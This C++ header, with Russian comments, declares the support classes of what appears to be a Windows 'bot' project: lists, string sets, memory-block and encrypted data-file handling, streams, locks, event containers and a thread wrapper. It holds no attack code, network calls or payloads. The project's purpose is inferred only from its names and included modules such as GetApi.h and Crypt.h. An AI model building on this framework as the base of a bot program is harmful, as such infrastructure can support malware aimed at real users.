#ifndef BotClassesH
#define BotClassesH


//---------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Crypt.h"
#include "Strings.h"
#include "Memory.h"



class TBotStream;



//********************************************************************
// Шаблон списка элементов. Аналогия вектора C++
//********************************************************************
template <class TItem>
class TListTemplate : public TBotObject
{
private:
	int    FCount;
	int    FCapacity;
	TItem* FItems;
	TItem  FEmptyItem;

	bool UpdateCapacity();
	bool CheckIndex(int Index);
protected:
	void virtual DoDelete(TItem Item);
public:
	TListTemplate();
	~TListTemplate();

	int   Add(TItem Item);
	int   Count();
	void  Clear();
	void  Delete(int Index);
	int   IndexOf(TItem Item);
	int   Remove(TItem Item);
	TItem GetItem(int Index);
	void  SetItem(int Index, TItem Item);
	bool  SetCapacity(int Value);

	TItem  operator[](int Index);
};

// Реализация шаблона выведена в другой модуль
#include "ListTemplate.cpp"


typedef TListTemplate<void*> TCustomList;


class TBotList;


typedef void (*TListNotifyEvent)(TBotList*, LPVOID);


//********************************************************************
// TBotList - список указателей
//********************************************************************
class TBotList : public TCustomList
{
protected:
	void DoDelete(void* Item);
public:
	TBotList();
	~TBotList();
	TListNotifyEvent OnDelete;
};


//------------------------------------------------------
//  Данное обхявление введено для разделения конфликта
//  имён при программировании в Builder C++
//------------------------------------------------------
//#define TList TBotList





//********************************************************************
//	TBotStrings - список строк
//********************************************************************
class TBotStrings : public TBotObject
{
private:
	TBotList FItems;
    int    PutStr(string *Str);
	bool   IsName(const string& S, DWORD* NameEnd, DWORD* ValueStart);
	int    SearchName(const char* Name, string* Value);
	string MakeValueString(const char* Name, const char* Value);
public:
	string ValueDelimeter;

	TBotStrings();
	~TBotStrings();

	int    Add(const char*   Value);
	int    Add(const string& Value);
	int    AddValue(const char* Name, const char* Value);
	int    AddValue(const char* Name, const string &Value);
	int    AddValue(const string &Name, const string &Value);
	int    Count();
	void   Clear();
	void   Delete(int Index);
	int    IndexOf(const char* Str);
	int    IndexOf(const string &Str);
	string GetItem(int Index);
	void   SetItem(int Index, const char* Item);
	void   SetItem(int Index, const string &Item);
	void   SetText(const char* Text);
	void   SetText(const string &Text);
	void   SetDelimetedText(const char* Text, const char* Delimeter);
	string GetText();
    string GetDelimetedText(const  char* Delimeter);
	string NameByIndex(int Index);
	string ValueByIndex(int Index);
	string        GetValue(const char* Name);
	string inline GetValue(const string& Name) { return GetValue(Name.t_str()); }
	void   SetValue(const char* Name, const char* Value);
	void   SaveToStream(TBotStream* Stream);
	void   LoadFromStream(TBotStream* Stream);
	string inline operator[](int Index) { return GetItem(Index); }
};


//-----------------------------------------------------------------------------
//                         Устаревшее!!!!!
//
/*----------------  Методы для работы со списками элементов -----------------*/

typedef LPVOID PList;

typedef void (*TFreeItemMethod)(LPVOID);

namespace List
{
	// Функция создания списка
	PList Create();

	// Функция уничтожения списка
	void Free(PList List);

	// Функция очистки списка
	void Clear(PList List);

	// Функция возвращает количество элементов списка
	DWORD Count(PList List);

	// Функция добавляет новый элемент
	int Add(PList List, LPVOID Item);

	// Функция удаляет элемент из списка
	void Delete(PList List, DWORD Index);

	// Удалить из списка элемент
	int Remove(PList List, LPVOID Item);

	// Извлечь элемент
	 LPVOID Extract(PList List, DWORD Index);

	// Функция возвращает позицию элемента в списке
	int IndexOf(PList List, LPVOID Item);

	// Функция устанавливает значение элементу ы указанной позиции Index
	void SetItem(PList List, DWORD Index, LPVOID Item);

	// Функция возвращает значение элемента из позиции Index
	LPVOID GetItem(PList List, DWORD Index);

	// Изменить размер зарегистрированных элементов
	bool SetCapacity(PList List, DWORD Value);

	// Установить метод автоматического удаления элементов
	void SetFreeItemMehod(PList List, TFreeItemMethod Method);

	// функция возвращает последний элемент списка
	LPVOID Last(PList List);

	// Функция копирует элементы из списка Source в список Destination
    void CopyFrom(PList Destination, PList Source);
}


// ----------------------------------------------------------------------------
//  Strings - Набор функция для работы со списками строк
//
//
//  ОСТАВЛЕНО ДЛЯ СОВМЕСТИМОСТИ
//
//  /* TODO : По возможности избавиться и перейти на TBotStrings */
// ----------------------------------------------------------------------------

typedef LPVOID PStrings;

namespace Strings
{
	// Создать набор строк
	PStrings Create();

	// Уничтожить набор строк
	void Free(PStrings Strings);

	// Очистить набор строк
	void Clear(PStrings Strings);

	// Получить количество строк
	DWORD Count(PStrings Strings);

	// Добавить новую строку/
	// По умолчанию строка дублируется. Чтобы отключить эту опцию
	// установите Duplicate = false. Строка Str должна быть создана
	// функцциями StrNew либо StrAlloc
	// В этом случае строка будет помещена в список
	// и управление жьзнью строки будет передану списку строк!!!
	int Add(PStrings Strings, PCHAR Str, bool Duplicate = true);

	// Получит строку из позиции
	PCHAR GetItem(PStrings Strings, DWORD Index, bool DuplicateStr = true);

	// Объеденяет все строки в одну. Если не указан
	// разделитель то использован разделитель заданный в настройках
	PCHAR GetText(PStrings Strings, PCHAR LineDelimeter = NULL);

	// Функция разбирает текст на строки разделённые символами новой
	// строки и перевода каретки
	void SetText(PStrings Strings, PCHAR Text);

	// Удалить строку в позиции Index
	void Delete(PStrings Strings, DWORD Index);

	// Функция удаляет строку Str из списка
	int Remove(PStrings Strings, PCHAR Str);

	// Функция возвращает позицию строки Str в списке
	int IndexOf(PStrings Strings, PCHAR Str);

	// Добавить в список пару Имя=Значение.
	// Если не указан разделитель то будет взят из настроек списка (по умолчанию =)
	int AddValue(PStrings Strings, PCHAR Name, PCHAR Value, PCHAR Delimeter = NULL);
}
//----------------------------------------------------------------------------------------------------





//---------------------------------------------------------------------------
//  MEMBLOCKS - Функции для работы с блоками памяти, списками блоков
//---------------------------------------------------------------------------
typedef struct TMemBlock
{
	DWORD ID;    // Идентификатор блока, зарезервировано для записи в файл
	DWORD Size;
	LPVOID Data;
}*PMemBlock;

typedef LPVOID PMemBlockList;

namespace MEMBLOCK
{
	// Создать список блоков
	PMemBlockList CreateList();

	// Уничтожить список блоков
	void FreeList(PMemBlockList List);

	// добавить новый блок в список
    PMemBlock AddBlock(PMemBlockList List, LPVOID Data, DWORD DataSize, bool Copy = true);

	// уничтожить блок памяти. ВАЖНО!!!! Мтодот оссвобождает память блока, но не
	// удаляет блок из списка (если он в нём находится);
	void FreeBlock(PMemBlock Block);

	// Функция подсчитывает общий размер данных всех блоков списка
	DWORD Size(PMemBlockList List);

	// Функция копирует данные всех блоков в буфер Buf.
	// Подразумевается, что Buf может уместить в себе все блоки
    void BuildToBuf(PMemBlockList List, LPVOID Buf);

	// Функция собирает все блоки в строку
	PCHAR BuildAsStr(PMemBlockList List, DWORD *TotalSize);

	// Функция собирает все блоки в строку
	LPVOID BuildAsMem(PMemBlockList List, DWORD *TotalSize);

	// Функция объеденяет блоки в один
	PMemBlock Pack(PMemBlockList List);

	// Функция вернёт истину если в списке есть блок с указанным идентификатором
	bool ContainBlock(PMemBlockList List, DWORD ID);

	// Получить блок по идентификатору
	PMemBlock GetBlockByID(PMemBlockList List, DWORD ID);
	PCHAR GetBlockByAsStr(PMemBlockList List, DWORD ID);
}


//------------------------------------------------------
//  Базовый заголовок файла
//------------------------------------------------------
#pragma pack(push, 1)
struct TFileHeader
{
	DWORD Signature;  // Сигнатура файла
	DWORD Version;    // Версия файла
};
#pragma pack(pop)


//---------------------------------------------------------------------------
//  DataFile - методы для работы с файлами данными
//---------------------------------------------------------------------------

#pragma pack(push, 1)
typedef struct TDataFileHead
{
	DWORD Signature;  // Сигнатура файла
	DWORD Version;    // Версия файла
	DWORD FileID;     // Идентификатор файла
	DWORD Flags;      // Флаги файла
	DWORD FlagsEx;    // Дополнительные флаги
} *PDataFileHead;
#pragma pack(pop)


enum TFileCryptMode {fcNone, fcBlock, fcFile};

typedef struct TDataFileRec
{
	HANDLE Handle;              // Идентификатор файла
	TDataFileHead Head;         // Заголовок файла
	TFileCryptMode CryptMode;   // Режим шифрования данных файла
	TCryptMethod CryptMethod;   // Метод криптования
	TCryptMethod DecryptMethod; // Метод расшифровки данных
	LPVOID CryptKey;            // ключ шифрования
	PMemBlockList Blocks;       // Список блоков
	PCHAR FileName;
} *PDataFile;



// Максрос возвращает DWORD из данных указателя
#define SIGNATURE(Pointer) (*(DWORD*)Pointer)

namespace DataFile
{
	// Функция создаёт файл с именем FileName, создаёт структуру описания
	// файла но при этом ничего в файл не записывает
    PDataFile CreateDataFile(PCHAR FileName, DWORD Signature);

	// Функция открывает файл для чтения и читает из него заголовок
	PDataFile OpenFile(PCHAR FileName, DWORD Signature);

	// Записывает данные из структуры File в физический файл
	bool WriteDataFile(PDataFile File);

	// Читает данные из физического файла в структуру File
	bool ReadDataFile(PDataFile File);

	// Функция закрывает файл и уничтожает структуру File
    void CloseFile(PDataFile File);

	// Добавить блок данных
	void AddDataBlock(PDataFile File, DWORD BlockID, LPVOID Data, DWORD DataSize, bool Copy = true);
	void AddDataBlock(PDataFile File, DWORD BlockID, PCHAR StrData);

	// Записать блоки данных ф файл
	bool WriteBlocksToFile(PDataFile File);

	// Записать блоки данных ф файл
	bool ReadBlocksFromFile(PDataFile File);

	// Зашифровать блоки данных
    bool CryptBlocks(PMemBlockList Blocks, LPVOID Key, TCryptMethod Method);
}




//**********************************************************
//  TLock - Объект входа в защищённую секцию. Основная
//          ысль в том, что при необходимости мы входим в
//			критическую секцию объявив статический объект.
//          При выходе из зоны видимости переменной объект
//			будет автоматически уничтожен и в деструкторе мы
//			выйдем из критической секции
//
//  Использовать только статические объявления объекта
//**********************************************************
class TLock
{
private:
	PRTL_CRITICAL_SECTION FSection;
public:

	TLock(PRTL_CRITICAL_SECTION Section);
	~TLock();

	TLock operator=(const TLock &Locker);
	TLock operator=(PRTL_CRITICAL_SECTION Section);
};



//--------------------------------------------------
//  TEventContainer - Класс, контейнер событий
//--------------------------------------------------

typedef void (*TBotEvent)(LPVOID Sender, int EventId, LPVOID EventData, LPVOID Param);

class TEventContainer : public TBotObject
{
private:
	TBotList *FEvents;
	RTL_CRITICAL_SECTION FLock;
protected:
	TLock inline GetLock() { return &FLock; }
public:
    TEventContainer();
	~TEventContainer();

	int  AttachEvent(int EventId, TBotEvent Event, LPVOID EventData);
	void DetachEvent(int EventIndex);
	void virtual CallEvent(int EventId, LPVOID Param);
	void CallEvent(int EventId);
};




//----------------------------------------------------
//  Режимы смещения ьекущей позиции в потоке
//  SEEK_ORIGIN...
//----------------------------------------------------
#define SO_BEGIN     FILE_BEGIN
#define SO_CURRENT   FILE_CURRENT
#define SO_END       FILE_END

//**********************************************************
//  TBotStream - Базовый класс чтения\записи
//**********************************************************
class TBotStream : public TBotObject
{
public:
	DWORD virtual Size();
	void  virtual SetSize(DWORD NewSize);
	DWORD virtual Seek(int Count, DWORD SeekMethod);
	DWORD virtual Write(const void* Buf, DWORD Count);
	DWORD virtual Read(void* Buf, DWORD Count);

	DWORD Position();
	void  SetPosition(DWORD NewPosition);

	DWORD WriteString(const char* Str);
	DWORD WriteString(const string &Str);
	DWORD WriteSizedString(const char* Str);
	DWORD WriteSizedString(const string &Str);

	LPVOID ReadToBuf(DWORD *Size);
	string ReadToString();
	int    ReadInt();
	BYTE   ReadByte();
	string ReadString(DWORD Size);
	string ReadSizedString();  // Читает строку формата [DWORD: Размер][Строка]
};


//**********************************************************
// TBotMemoryStream - Класс чтения/записи данных из
//                    выделенного блока памяти
//**********************************************************
class TBotMemoryStream : public TBotStream
{
private:
    bool   FAssigned;
	LPBYTE FMemory;
	DWORD  FSize;
	DWORD  FPosition;
	DWORD  FCapacity;
	void   SetPointer(LPBYTE Ptr, DWORD Size);
	LPBYTE Realloc(DWORD &NewCapacity);
    void   SetCapacity(DWORD NewCapacity);
public:
	TBotMemoryStream(LPVOID Mem, DWORD MemSize);
	TBotMemoryStream();
	~TBotMemoryStream();

	DWORD Read(void* Buf, DWORD Count);
	DWORD Write(const void* Buf, DWORD Count);

	DWORD Size();
	void  SetSize(DWORD NewSize);

	DWORD Seek(int Count, DWORD SeekMethod);

	LPVOID Memory();
};





//**********************************************************
//  Режимы открытия файлов.
//**********************************************************
static const BYTE fcmRead      = 0;
static const BYTE fcmWrite     = 1 ;
static const BYTE fcmReadWrite = 2;
static const WORD fcmCreate    = 0xFF00;


//**********************************************************
//  TBotFileStream - класс чтения\записи данных файла
//**********************************************************
class TBotFileStream : public TBotStream
{
private:
	HANDLE FHandle;
public:
	TBotFileStream(const char* FileName, WORD Mode);
	~TBotFileStream();
	bool Valid();
	void Close();
	DWORD Size();
    void  SetSize(DWORD NewSize);
	DWORD Seek(int Count, DWORD MoveMode);
	DWORD Write(const void* Buf, DWORD Count);
	DWORD Read(void* Buf, DWORD Count);
	HANDLE inline Handle() { return FHandle; }
};


//**********************************************************
//  TBotCollection - Коллекия элементов
//**********************************************************
class TBotCollectionItem;

class TBotCollection : public TBotObject
{
private:
	TBotList FItems;
    PRTL_CRITICAL_SECTION FLock;
	void InsertItem(TBotCollectionItem* Item);
	void RemoveItem(TBotCollectionItem* Item);

	friend class TBotCollectionItem;
protected:
	void Lock();
	void Unlock();
public:
	TBotCollection();
	~TBotCollection();


	void virtual Clear();
	void  SetThreadSafe();
	int   Count();
	TLock GetLocker();
	TBotCollectionItem* Items(int Index);
	inline TBotCollectionItem* operator [](int Index) { return Items(Index); }
};


//**********************************************************
//  TBotCollectionItem - Элемент коллекции
//**********************************************************
class TBotCollectionItem : public TBotObject
{
private:
	TBotCollection* FOwner;

	friend class TBotCollection;
protected:
	void Lock();
	void Unlock();
public:
	TBotCollectionItem(TBotCollection* aOwner);
	~TBotCollectionItem();

	TBotCollection* Owner();
	void            SetOwner(TBotCollection* aOwner);
};



//**********************************************************
//  TValues - Набор именованных значений
//**********************************************************

class TValue : public TBotCollectionItem
{
public:
	TValue(TBotCollection* aOwner) : TBotCollectionItem(aOwner) {};
	string Name;
	string Value;
};


class TValues : public TBotCollection
{
protected:
	  TValue* GetItemByName(const char* Name);
public:
	TValues();

	void AddValue(const string &Name, const string &Value);
	void SetValue(int Index, const string &Value);
	void SetValue(const char* Name, const string &Value);

	string GetValue(int Index);
	string GetValue(const char *Name);

    inline TValue* Items(int Index) { return (TValue*)((TBotCollection*)this)->Items(Index); }

};






#define  DATA_FILE_SIGNATURE 0x3878C167 /* BOT_DATA_FILE */
#define  DATA_FILE_VERSION   0x00010000 /* 1.0 */


// Базовые типы данных
#define BLOCK_TYPE_VARIABLE 0xFF01 /* Имя переменной */
#define BLOCK_TYPE_TEXT     0xFF02 /* Текстовый блок */
#define BLOCK_TYPE_FILE     0xFF03 /* Файл           */
#define BLOCK_TYPE_DELETED  0xFFFF /* Удалённый блок */



//************************************************************
//
//************************************************************
class TDataBlock : public TValue
{
private:
	bool   FDataAssigned;
	LPVOID FData;
	DWORD  FSize;
protected:

	// методы чтения/записи данных
	bool WriteBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);
	bool ReadBuf(LPVOID Buf, DWORD BufSize, bool Crypt, bool Hash);

	// Методы чтения/записи частей блока
	bool virtual WriteHeader();
	bool virtual WriteData();
	bool virtual ReadHeader();
	bool virtual ReadData();
public:
	DWORD  Type;  // Тип блока
    string Name;  // Имя блока

	TDataBlock();
	~TDataBlock();
	LPVOID inline Data() { return FData; }
	DWORD  inline Size() { return FSize; }

//    bool SaveToStream(TBotStream *Stream);
};


//************************************************************
//  TDataFile - Файл хранения данных в файле в  блочном
//              формате
//  Структура файла:
//  [Заголовок файла: TFileHead][Заголовок данных: TDataHead]
//  [Заголовок блока][Данные блока]...{другие блоки}
//************************************************************
class TDataFile : public TBotObject
{
private:
	TBotStream *FStream;
	bool FStreamAssigned;
	bool WriteHeaders();
	bool ReadHeaders();
	bool WriteBlock(const TDataBlock &Block);
    bool ReadBlock(const TDataBlock &Block);
protected:
	bool Write(const void* Buf, DWORD BufSize, bool Encrypt = true, bool Hash = true);
	bool Read(void* Buf, DWORD BufSize, bool Decrypt = true, bool Hash = true);
	DWORD GetVarID();
public:
	DWORD  Signature; // Сигнатура файла
	DWORD  Version;   // Версия файла
	DWORD  Type;      // Тип данных
	DWORD  Flags;     // Флаги (Зарегистрировано для доп. нужд)
	DWORD  FlagsEx;   // Флаги (Зарегистрировано для доп. нужд)
	string Name;      // Имя набора данных

	TDataFile();
	~TDataFile();

	bool Create(const char* FileName);
	bool Create(TBotStream *Stream);

	bool Open(const char* FileName);
	bool Open(TBotStream *Stream);

	bool Add(WORD Type, const char *Name, LPVOID Data, DWORD DataSize);

    void Close();
};



//*******************************************************************
//  TBotThread - Класс, надстройка над апи для работы с потоком
//*******************************************************************
class TBotThread : public TBotObject
{
private:
	bool   FTerminated;
	HANDLE FHandle;
	DWORD  FId;
    void Execute();


    friend DWORD WINAPI __BotThreadProcedure(LPVOID Owner);
protected:
	void virtual DoExecute();
    bool virtual Terminated();
public:
	TBotThread(bool StartThread);
	virtual ~TBotThread();
	void virtual Terminate();
	void Start();
    void Wait();
    HANDLE Handle();
};


//---------------------------------------------------------------------------
#endif
